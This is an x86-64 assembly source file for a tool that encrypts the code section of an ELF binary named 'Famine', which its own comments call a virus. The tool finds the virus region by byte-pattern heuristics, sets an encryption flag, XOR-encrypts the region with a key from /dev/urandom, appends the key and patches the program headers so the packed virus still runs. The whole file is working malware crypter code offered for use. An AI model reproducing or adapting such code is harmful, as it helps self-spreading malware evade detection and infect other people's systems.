; encrypt_famine.s
; Standalone ASM tool to encrypt the Famine binary after compilation
; This tool reads the Famine binary, encrypts the virus code section,
; and appends the encryption key to the file

%include "include.s"

section .bss
    file_buffer:        resb 65536      ; Buffer to hold the binary (64KB max)
    key_buffer:         resb 16         ; Buffer for encryption key (KEY_SIZE)
    symbol_buffer:      resb 4096       ; Buffer for reading nm output
    
section .data
    famine_path:        db "./Famine", 0
    famine_tmp_path:    db "./Famine.tmp", 0
    urandom_path:       db "/dev/urandom", 0
    msg_encrypting:     db "Encrypting Famine binary...", 10, 0
    msg_done:           db "Encryption complete!", 10, 0
    msg_error:          db "Error: could not encrypt Famine", 10, 0
    msg_size_error:     db "Error: Famine binary too large (>64KB)", 10, 0

section .text
global _start

; ============================================
; print_msg - Print a null-terminated string to stdout
; rdi = pointer to string
; ============================================
print_msg:
    push rdi
    push rsi
    push rdx
    push rax
    
    ; Calculate string length
    mov rsi, rdi
    xor rdx, rdx
.len_loop:
    cmp byte [rsi + rdx], 0
    je .len_done
    inc rdx
    jmp .len_loop
.len_done:
    
    ; Write to stdout
    mov eax, SYS_WRITE
    mov edi, STDOUT
    ; rsi already has the string pointer
    ; rdx already has the length
    syscall
    
    pop rax
    pop rdx
    pop rsi
    pop rdi
    ret

; ============================================
; get_random_key - Generate random KEY_SIZE-byte key using /dev/urandom
; rdi = pointer to buffer (must be at least KEY_SIZE bytes)
; Returns: 0 on success, -1 on error
; ============================================
get_random_key:
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push r12
    
    mov r12, rdi                ; save buffer pointer
    
    ; Open /dev/urandom
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    lea rsi, [rel urandom_path]
    xor edx, edx                ; O_RDONLY = 0
    xor r10d, r10d
    syscall
    
    test rax, rax
    js .random_error
    
    mov rbx, rax                ; save fd
    
    ; Read KEY_SIZE random bytes
    mov eax, SYS_READ
    mov rdi, rbx
    mov rsi, r12
    mov edx, KEY_SIZE
    syscall
    
    ; Close /dev/urandom
    push rax                    ; save read result
    mov eax, SYS_CLOSE
    mov rdi, rbx
    syscall
    pop rax                     ; restore read result
    
    ; Check if we read enough bytes
    cmp rax, KEY_SIZE
    jl .random_error
    
    ; Success
    xor rax, rax
    jmp .random_done
    
.random_error:
    mov rax, -1
    
.random_done:
    pop r12
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

; ============================================
; Main entry point
; ============================================
_start:
    ; Print message
    lea rdi, [rel msg_encrypting]
    call print_msg
    
    ; Open Famine binary for reading
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    lea rsi, [rel famine_path]
    xor edx, edx                ; O_RDONLY = 0
    xor r10d, r10d
    syscall
    
    test rax, rax
    js .error_exit
    
    mov r12, rax                ; save fd in r12
    
    ; Get file size
    mov eax, SYS_LSEEK
    mov edi, r12d
    xor esi, esi
    mov edx, SEEK_END
    syscall
    
    test rax, rax
    jle .error_close
    
    cmp rax, 65536              ; Check if file is too large
    jg .size_error
    
    mov r13, rax                ; save file size in r13
    
    ; Seek back to beginning
    mov eax, SYS_LSEEK
    mov edi, r12d
    xor esi, esi
    xor edx, edx                ; SEEK_SET = 0
    syscall
    
    ; Read entire file into buffer
    mov eax, SYS_READ
    mov edi, r12d
    lea rsi, [rel file_buffer]
    mov edx, r13d               ; file size
    syscall
    
    cmp rax, r13                ; check if we read the entire file
    jne .error_close
    
    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, r12d
    syscall
    
    ; Generate random encryption key
    lea rdi, [rel key_buffer]
    call get_random_key
    test rax, rax
    jnz .error_exit
    
    ; Now we need to find the offsets of encrypt_start, virus_end, and encryption_flag
    ; in the file. These are at known offsets relative to the .text section start.
    
    ; Parse ELF header to find .text section
    lea r14, [rel file_buffer]  ; r14 = start of file buffer
    
    ; Check ELF magic
    cmp dword [r14], 0x464c457f ; "\x7fELF"
    jne .error_exit
    
    ; Check if it's 64-bit
    cmp byte [r14 + 4], 2       ; EI_CLASS = ELFCLASS64
    jne .error_exit
    
    ; Get entry point (this is the virtual address of _start)
    mov r15, [r14 + 24]         ; e_entry at offset 24
    
    ; Get program header table offset
    mov rbx, [r14 + 32]         ; e_phoff at offset 32
    
    ; Get program header count
    movzx ecx, word [r14 + 56]  ; e_phnum at offset 56
    
    ; Find the LOAD segment containing the entry point (.text segment)
    lea rsi, [r14 + rbx]        ; rsi = program headers start
    
    xor rbx, rbx                ; rbx = phdr index
.find_text_loop:
    cmp rbx, rcx
    jge .error_exit             ; Not found
    
    ; Each program header is 56 bytes (ELF64_PHDR_SIZE)
    mov rax, rbx
    imul rax, 56
    lea rdx, [rsi + rax]        ; rdx = current phdr
    
    ; Check if it's PT_LOAD
    cmp dword [rdx], PT_LOAD
    jne .next_phdr
    
    ; Check if this segment contains the entry point
    mov r8, [rdx + 16]          ; p_vaddr
    mov r9, [rdx + 40]          ; p_memsz
    add r9, r8                  ; end vaddr = p_vaddr + p_memsz
    
    cmp r15, r8                 ; entry < segment start?
    jl .next_phdr
    cmp r15, r9                 ; entry >= segment end?
    jge .next_phdr
    
    ; Found the .text segment
    mov r10, [rdx + 8]          ; p_offset (file offset of segment)
    mov r11, [rdx + 16]         ; p_vaddr (virtual address of segment)
    
    ; Calculate and save the index of this phdr for later use
    ; index = (rdx - phdr_start) / 56
    sub rdx, rsi                ; offset from phdr_start
    push rdx                    ; save phdr offset in bytes
    
    ; The file contains symbols at fixed offsets from virus_start
    ; In the actual binary, virus_start, encrypt_start, virus_end, and encryption_flag
    ; are at predictable locations
    
    ; From the source code structure:
    ; virus_start is at the beginning of .text
    ; original_entry_storage is at virus_start + 0 (8 bytes)
    ; encryption_flag is at virus_start + 8 (8 bytes)
    ; _start is at virus_start + 16
    ; decrypt_file starts after _start
    ; encrypt_start is after all the non-encrypted code
    
    ; We need to search for specific patterns to find these locations
    ; The encryption_flag is 8 bytes of 0, and it's preceded by original_entry_storage (also 8 bytes of 0)
    ; So we search for 16 bytes of 0 at the start of .text
    
    lea rdi, [r14 + r10]        ; rdi = start of .text in file
    
    ; Search for 16 consecutive zero bytes (original_entry_storage + encryption_flag)
    mov rcx, 1024               ; search in first 1KB
    xor rbx, rbx                ; offset
    
.search_flag:
    cmp rbx, rcx
    jge .error_exit
    
    ; Check for 16 zero bytes
    cmp qword [rdi + rbx], 0
    jne .next_search_byte
    cmp qword [rdi + rbx + 8], 0
    je .found_markers
    
.next_search_byte:
    inc rbx
    jmp .search_flag
    
.found_markers:
    ; rbx points to original_entry_storage
    ; rbx + 8 points to encryption_flag
    
    ; Set encryption_flag to 1
    mov qword [rdi + rbx + 8], 1
    
    ; Now find encrypt_start by searching for "/dev/urandom" string
    ; which is just before encrypt_start
    lea rsi, [rdi + rbx]        ; start searching from virus_start
    mov rcx, 0x400              ; search within 1KB
    
    ; Search for "/dev/urandom" string
    xor r8, r8                  ; r8 = search position
    
.search_urandom:
    cmp r8, rcx
    jge .error_exit             ; not found
    
    ; Check if we found "/dev/urandom" (13 bytes)
    cmp byte [rsi + r8], '/'
    jne .next_urandom_byte
    cmp dword [rsi + r8 + 1], 'dev/'  ; Check "dev/"
    jne .next_urandom_byte
    cmp dword [rsi + r8 + 5], 'uran'  ; Check "uran"
    jne .next_urandom_byte
    cmp dword [rsi + r8 + 9], 'dom' ; Check "dom"
    jne .next_urandom_byte
    cmp byte [rsi + r8 + 12], 0     ; Check null terminator
    je .found_urandom
    
.next_urandom_byte:
    inc r8
    jmp .search_urandom
    
.found_urandom:
    ; encrypt_start is right after "/dev/urandom\0" (13 bytes)
    add r8, 13                  ; skip the string
    
    ; Start of encryption = rsi + r8
    lea rsi, [rsi + r8]
    
    ; Now find virus_end by searching for the function prologue of add_pt_load
    ; which is the first function after virus_end
    ; add_pt_load starts with: push rbp; mov rbp, rsp; sub rsp, ...
    ; In hex: 55 48 89 e5 48 83 ec
    
    ; Search forward from current position
    mov rcx, 0x1000             ; search within 4KB
    xor r8, r8
    
.search_add_pt_load:
    cmp r8, rcx
    jge .error_exit             ; not found
    
    ; Check for function prologue pattern: 55 48 89 e5
    cmp byte [rsi + r8], 0x55   ; push rbp
    jne .next_prologue_byte
    cmp byte [rsi + r8 + 1], 0x48  ; rex.w prefix
    jne .next_prologue_byte
    cmp byte [rsi + r8 + 2], 0x89  ; mov
    jne .next_prologue_byte
    cmp byte [rsi + r8 + 3], 0xe5  ; %rbp, %rsp
    je .found_add_pt_load
    
.next_prologue_byte:
    inc r8
    jmp .search_add_pt_load
    
.found_add_pt_load:
    ; virus_end is at rsi + r8
    lea r9, [rsi + r8]          ; end of encryption
    
    ; Calculate size to encrypt
    mov rcx, r9
    sub rcx, rsi                ; rcx = size
    
    ; Sanity check
    test rcx, rcx
    jle .error_exit
    
    ; Encrypt the region: XOR with key
    lea rdi, [rel key_buffer]   ; key
    xor r14, r14                ; key index
    
.encrypt_loop:
    test rcx, rcx
    jz .encrypt_done
    
    mov al, [rsi]               ; load byte
    xor al, [rdi + r14]         ; XOR with key byte
    mov [rsi], al               ; store encrypted byte
    
    inc rsi                     ; next data byte
    inc r14                     ; next key byte
    and r14, (KEY_SIZE - 1)     ; wrap around key (KEY_SIZE must be power of 2)
    
    dec rcx
    jmp .encrypt_loop
    
.encrypt_done:
    ; Write the encrypted file back
    ; Open for writing
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    lea rsi, [rel famine_tmp_path]
    mov edx, O_WRONLY | 0x40 | 0x200  ; O_WRONLY | O_CREAT | O_TRUNC
    mov r10d, 0644              ; mode
    syscall
    
    test rax, rax
    js .error_exit
    
    mov r12, rax                ; save fd
    
    ; Write file content
    mov eax, SYS_WRITE
    mov edi, r12d
    lea rsi, [rel file_buffer]
    mov edx, r13d               ; original file size
    syscall
    
    test rax, rax
    js .error_close
    
    ; Append key to file
    mov eax, SYS_WRITE
    mov edi, r12d
    lea rsi, [rel key_buffer]
    mov edx, KEY_SIZE
    syscall
    
    test rax, rax
    js .error_close
    
    ; Now we need to update the program headers to extend the .text segment
    ; to include the appended key
    ; Retrieve the phdr offset we saved earlier
    pop r8                      ; restore phdr offset in bytes
    
    ; Get the phdr table location in the buffer
    lea r14, [rel file_buffer]
    mov rbx, [r14 + 32]         ; e_phoff
    lea rsi, [r14 + rbx]        ; phdr table start
    add rsi, r8                 ; rsi = pointer to .text phdr in buffer
    
    ; Update p_filesz and p_memsz
    mov rax, [rsi + 32]         ; p_filesz
    add rax, KEY_SIZE           ; add key size
    mov [rsi + 32], rax         ; update p_filesz
    
    mov rax, [rsi + 40]         ; p_memsz
    add rax, KEY_SIZE           ; add key size
    mov [rsi + 40], rax         ; update p_memsz
    
    ; Write the updated program headers back to the file
    ; Seek to program headers
    mov eax, SYS_LSEEK
    mov edi, r12d
    mov rsi, rbx                ; e_phoff
    xor edx, edx                ; SEEK_SET
    syscall
    
    ; Get number of program headers and total size
    movzx ecx, word [r14 + 56]  ; e_phnum
    imul ecx, 56                ; * sizeof(phdr)
    
    ; Get pointer to phdrs in our buffer
    lea rsi, [r14 + rbx]
    
    ; Write updated program headers
    mov eax, SYS_WRITE
    mov edi, r12d
    ; rsi already set
    mov edx, ecx
    syscall
    
    test rax, rax
    js .error_close
    
    ; Close file
    mov eax, SYS_CLOSE
    mov edi, r12d
    syscall
    
    ; Rename Famine.tmp to Famine
    ; Use renameat2 syscall (316)
    mov eax, 316                ; SYS_renameat2
    mov edi, AT_FDCWD
    lea rsi, [rel famine_tmp_path]
    mov edx, AT_FDCWD
    lea r10, [rel famine_path]
    xor r8d, r8d                ; flags
    syscall
    
    test rax, rax
    js .error_exit
    
    ; Print success message
    lea rdi, [rel msg_done]
    call print_msg
    
    ; Exit successfully
    mov eax, 60                 ; SYS_exit
    xor edi, edi
    syscall
    
.next_phdr:
    inc rbx
    jmp .find_text_loop

.size_error:
    mov eax, SYS_CLOSE
    mov edi, r12d
    syscall
    
    lea rdi, [rel msg_size_error]
    call print_msg
    
    mov eax, 60
    mov edi, 1
    syscall

.error_close:
    mov eax, SYS_CLOSE
    mov edi, r12d
    syscall
    
.error_exit:
    lea rdi, [rel msg_error]
    call print_msg
    
    mov eax, 60
    mov edi, 1
    syscall
